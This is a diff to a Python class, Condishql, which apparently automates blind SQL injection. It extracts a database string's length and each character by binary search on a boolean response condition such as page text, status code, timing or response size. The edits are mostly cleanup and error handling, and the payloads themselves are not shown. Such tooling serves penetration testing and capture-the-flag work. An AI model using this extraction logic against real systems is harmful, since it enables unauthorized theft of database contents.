@@ -1,5 +1,6 @@
 import requests
 import time
+import sys
 import math
 import urllib.parse
 import urllib3
@@ -51,9 +52,11 @@ class Condishql:
         }
 
     def isMatch(self, response):  # Change me to whatever condition counts as True
-        return "Welcome back!" in str(response.content)
-        # e.g. return response.code == 403
-        # e.g. return response.timetaken > 1s #todo LOL
+        return "Welcome back!" in response.text
+        # examples:
+        # return response.status_code == 403
+        # return response.elapsed > datetime.timedelta(milliseconds=100)
+        # return len(response.content) > 11443
 
     def getValue(self, payload, args, range=(0, math.inf), context=None):
         """ Determines the value of a vairable based on a halving/doubling of the search space """
@@ -92,7 +95,6 @@ class Condishql:
         ''' Determines the value of each character in a [length]-long string '''
 
         result = ''
-        print(f'Query: {self.query}. Retrieving {length} characters:')
 
         for i in range(1, length + 1):
             args = {
@@ -103,7 +105,7 @@ class Condishql:
             result += chr(self.getValue(
                 payload=self.payloads['character'],
                 args=args,
-                range=(0x20, 0x7E),  # range of ASCII printable characters
+                range=(0x20, 0x7E),  # range of printable ASCII characters
                 context={
                     'i': i,
                     'length': length,
@@ -117,7 +119,7 @@ class Condishql:
                 value=result,
                 operator='=')):
             raise ValueError
-        
+
         print(f'\n{result}')
 
         return result
@@ -140,6 +142,8 @@ class Condishql:
         return self.isMatch(r)
 
     def grab(self):
+        
+
         try:
             args = {
                 'query': self.query,
@@ -147,10 +151,14 @@ class Condishql:
             }
             length = self.getValue(self.payloads['length'], args)
 
+            print(f'Query: \'{self.query}\'. Retrieving {length} characters:')
+
             return self.getString(length)
-        except Exception as e:
-            print(e)
-            # print(file=sys.stderr)
+        except ValueError:
+            print('The result was invalid, either due to a syntax error or because no result exists. Send the requests to Repeater and sanity check them.', file=sys.stderr)
+
+    def parseFile(self, filename):
+        return
 
 
 if __name__ == "__main__":
